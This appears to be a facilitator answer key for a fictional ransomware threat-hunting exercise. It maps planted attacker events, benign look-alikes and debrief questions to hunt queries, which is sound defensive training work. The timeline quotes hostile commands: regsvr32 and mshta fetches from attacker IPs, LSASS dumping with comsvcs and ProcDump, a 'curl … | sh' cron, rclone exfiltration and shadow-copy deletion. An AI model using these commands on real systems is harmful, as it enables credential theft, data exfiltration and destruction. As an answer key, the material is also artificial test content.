# Facilitator guide (answer key)

> **Do not distribute before the debrief.** The machine-readable ground truth, listing every planted event and benign look-alike by `LabEventId`, is in [`data/answer_key.json`](../data/answer_key.json). `python tests/test_lab_detections.py` checks that every Sigma rule still returns exactly those events.

## Scenario: Operation Quiet Ledger (fictional)

| Time (UTC) | Host | Activity | Hunt |
|---|---|---|---|
| Oct 06 23:31–23:46 | Entra ID (jmiller) | 14 denied MFA pushes from `203.0.113.99` (NL VPN exit) | HL-0012 |
| Oct 06 23:47 | Entra ID (jmiller) | Push approved; sign-in succeeds from the same IP | HL-0012 |
| Oct 06 23:51–23:52 | Entra ID (jmiller) | Service principal "Remittance Viewer" added, then **user consent** to `Mail.Read Files.Read.All offline_access` (unverified publisher). The mailbox access is used to craft the next day's remittance lure | HL-0011 |
| Oct 07 08:52 | WS-HR-03 (akhan) | Outlook → `mshta https://203.0.113.80/invoice_8841.hta`. Blocked attempt with no follow-on activity | HL-0008 |
| Oct 07 09:14 | **WS-FIN-07 (jmiller)** | WINWORD (`Q3_Remittance.docm`) → hidden encoded PowerShell cradle to `203.0.113.45`. **Patient zero** | HL-0001 |
| Oct 07 09:15 | WS-FIN-07 | `regsvr32 /i:http://203.0.113.45/r.sct scrobj.dll` (Squiblydoo) | HL-0008 |
| Oct 07 09:18 | WS-FIN-07 | regsvr32 → plain-text cradle for `stage2.ps1` | HL-0001 |
| Oct 07 09:21 | WS-FIN-07 | Run value `OneDriveUpdate` → `AppData\Roaming\Microsoft\odupd.exe` | HL-0004 |
| Oct 07 09:23 | WS-FIN-07 | Task `\Microsoft\Windows\WindowsUpdate\Sync` → `C:\ProgramData\svcupd\svchost.exe` as SYSTEM | HL-0003 |
| Oct 07 09:25 → Oct 08 02:30 | WS-FIN-07 | `odupd.exe` beacons every ~300 s (±15 s) with TXT queries to `<32 base32>.t.cdn-sync-telemetry.example` (206 queries, CV ≈ 0.03) | HL-0014 |
| Oct 07 10:41–42 | SRV-DC-01 (requests from 10.10.20.57) | jmiller requests RC4 tickets for 4 SPNs in about 1 minute | HL-0006 |
| Oct 07 11:03 | WS-FIN-07 | `rundll32 comsvcs.dll, MiniDump 712` (LSASS) | HL-0002 |
| Oct 08 00:11–15 | SRV-FILE-01 (svc_backup) | 4624 type 3 from WS-FIN-07, then WmiPrvSE → `cmd /Q /c … 1> \\127.0.0.1\ADMIN$\__…` (wmiexec) | HL-0005 |
| Oct 08 00:25 | SRV-FILE-01 | Renamed ProcDump `pd64.exe -ma lsass.exe` | HL-0002 |
| Oct 08 00:40, 00:58 | SRV-FILE-01, SRV-BKP-01 | RDP (4624 type 10) as svc_backup from 10.10.20.57 | HL-0009 |
| Oct 08 01:05 | SRV-BKP-01 | PSEXESVC → `cmd /c C:\ProgramData\svcupd\kill.bat` | HL-0005 |
| Oct 08 01:20–01:50 | SRV-FILE-01 | `rcl.exe` (rclone, renamed) copies `\\SRV-FILE-01\Finance` to `mega:fin`. 60 connections to `*.mega.co.nz` | HL-0010 |
| Oct 08 01:33–01:37 | LNX-NAS-01 (root over SSH) | wget payload to `/dev/shm/.nwcache/`, cron `/etc/cron.d/nwcache` running `curl … \| sh` against `203.0.113.45`, systemd unit `dbus-cache.service` → `/dev/shm`, `systemctl enable --now` | HL-0013 |
| Oct 08 02:02–02:11 | SRV-FILE-01, SRV-BKP-01 | vssadmin, wmic shadowcopy, bcdedit ×2, wbadmin delete catalog (parent: `kill.bat`) | HL-0007 |
| Oct 08 02:14, 02:19 | SRV-FILE-01, SRV-BKP-01 | **Encryptor** `C:\ProgramData\svcupd\svchost.exe -p \\<host>\D$ -nomutex`. No hunt matches it; participants find it by pivoting | none |

| Oct 08 02:20 | LNX-NAS-01 | **Linux encryptor** `/dev/shm/.nwcache/dbus-cached --path /volume1 --ext .qledger`, started by systemd. No hunt matches it; found by pivoting from HL-0013 | none |

**Dwell time:** about 17 hours from the first macro execution to encryption, consistent with the brief's "under 24 hours". Counting from the cloud account takeover it is about 27 hours, which is a useful debrief point about where the clock really starts.
**Cracked account:** `svc_backup`. It was one of the four Kerberoasted SPNs and is used for every later lateral movement.

## Benign look-alikes (what good triage sounds like)

| Hunt | Look-alike | How to tell |
|---|---|---|
| HL-0001 | SCCM inventory: `CcmExec.exe` → `powershell -enc` | 18 hosts, every morning, SYSTEM, signed management parent. The decoded text is `Get-CimInstance Win32_OperatingSystem` |
| HL-0003 | Dell SupportAssist task from `C:\ProgramData\Dell\…` | Signed vendor installer parent, descriptive task name, several hosts |
| HL-0004 | Spotify Run value in `AppData\Roaming\Spotify` | Signed, user-installed app. The value name matches the binary it launches |
| HL-0005 | PSEXESVC → `cmd /c iisreset /status` on SRV-APP-02 | `admin_tlee` from **JMP-ADM-01** (type 3 logon from 10.10.5.10). Benign command |
| HL-0006 | `svc_legacyapp` → `svc_legacydb` RC4 | One SPN, three times a day, from a server, every day. The fix is AES for the legacy account, not an exclusion forever |
| HL-0007 | Veeam `vssadmin delete shadows /for=E: /oldest` | Backup service parent, one volume, `/oldest`, nightly at 01:30 |
| HL-0009 | `hd_support` RDP from HD-SUPPORT-01 to workstations | Support subnet, a support account, workstation destinations. Check against tickets |
| HL-0010 | `rclone sync … s3corp:` on SRV-BKP-01 | Program Files install, named sanctioned remote, `svc_rclone`, nightly |
| HL-0011 | Admin consent to "Northwind Backup for M365" | Admin consent by `admin_tlee`, verified publisher, sanctioned backup vendor. The scopes fit the app's purpose |
| HL-0012 | `user05` with 3 MFA timeouts; 4 users with a single denial | Office IP, "did not respond" (not "declined"), below the burst threshold. user05 replaced their phone, and the help desk re-registered MFA |
| HL-0013 | Ansible `cp /tmp/ansible-tmp-…/source /etc/systemd/system/node_exporter.service`; healthcheck cron | python3 parent, both hosts in one change window. The cron calls the internal `healthchecks.lab.example` |
| HL-0014 | NorthShield AV `<sha1>.rep.northshield.example` TXT lookups | Signed AV agent, ~30 hosts, irregular timing (no beacon). The parent domain belongs to the AV vendor |

Near-misses the queries should **not** return: the admin's `procdump64 -ma w3wp.exe` (HL-0002), Google Update tasks (HL-0003), Teams and OneDrive Run keys (HL-0004), the SCCM compliance script through WMI (HL-0005, filtered), machine-account RC4 tickets (HL-0006, filtered), the local payroll HTA and `rundll32 printui`/`shell32` calls (HL-0008), and admin RDP from the jump host (HL-0009, filtered).

## Debrief prompts

- Which look-alike took your team longest to clear? What one field would have cleared it fastest?
- The HL-0008 hit on WS-HR-03 is malicious, but it had no follow-on activity. How do you record it? *(Malicious, contained: an intel update and a check on the email gateway, not an incident.)*
- The brief's IPs appear only in network data. Which hunts would still have worked after the actor rotated infrastructure?
- Which data gaps would have hidden the attack? *(No command-line auditing breaks HL-0001/2/3/5/7/8/10. No 4769 auditing breaks HL-0006.)*
- If you could promote only one detection on Monday, which would it be? HL-0007 is high fidelity but fires minutes before encryption. HL-0006 fires about 15 hours earlier.

## Timing tips

- Teams that finish early can try writing a correlation rule: two or more T1490 actions from the same parent within 10 minutes.
- Teams falling behind should skip HL-0003 and HL-0004 in round 1 and go straight to the round 2 credential hunts. The timeline still holds together without them.
